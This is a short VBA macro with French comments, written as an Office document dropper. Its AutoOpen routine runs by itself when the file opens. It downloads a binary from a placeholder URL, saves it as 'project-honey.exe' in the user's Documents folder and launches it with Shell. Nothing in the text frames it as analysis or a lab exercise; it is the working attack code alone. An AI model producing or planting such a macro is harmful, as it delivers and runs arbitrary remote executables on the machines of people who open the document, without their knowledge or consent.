Sub AutoOpen()

    Dim myURL As String
    myURL = "https://websitexxxxxx.com"

    Dim WinHttpRequest As Object
    Set WinHttpRequest = CreateObject("MSXML2.XMLHTTP") ' Utilisation de MSXML2 pour mieux gérer HTTPS

    ' Ouvrir la connexion sans authentification
    WinHttpRequest.Open "GET", myURL, False
    WinHttpRequest.Send

    ' Vérifier si le téléchargement a réussi
    If WinHttpRequest.Status = 200 Then

        Dim oStream As Object
        Set oStream = CreateObject("ADODB.Stream")

        oStream.Open
        oStream.Type = 1 ' Type binaire
        oStream.Write WinHttpRequest.responseBody

        ' Telechargement du fichier, on indique le chemin de telechargement et le nom du fichier, puis on le lance
        Dim FilePath As String
        FilePath = Environ("USERPROFILE") & "\Documents\project-honey.exe"

        oStream.SaveToFile FilePath, 2

        Shell FilePath, vbNormalFocus

    End If
End Sub
